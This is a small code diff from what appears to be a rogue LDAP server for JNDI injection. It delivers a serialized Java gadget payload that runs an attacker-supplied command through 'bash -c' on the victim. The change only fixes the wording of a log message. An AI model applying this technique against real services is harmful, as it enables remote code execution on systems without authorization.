@@ -28,7 +28,7 @@ public class RSOperationInterceptor implements LDAPInterceptor {
 
         byte[] data = CommonUtil.serialize(op.getObjectPayload(command));
         entry.addAttribute("javaSerializedData", data);
-        System.out.printf("[LDAP] send serial data directly >> use %s execute command [bash -c '%s']\n", this.gadget, command);
+        System.out.printf("[LDAP] send serialized data directly >> use %s execute command [bash -c '%s']\n", this.gadget, command);
 
         result.sendSearchEntry(entry);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
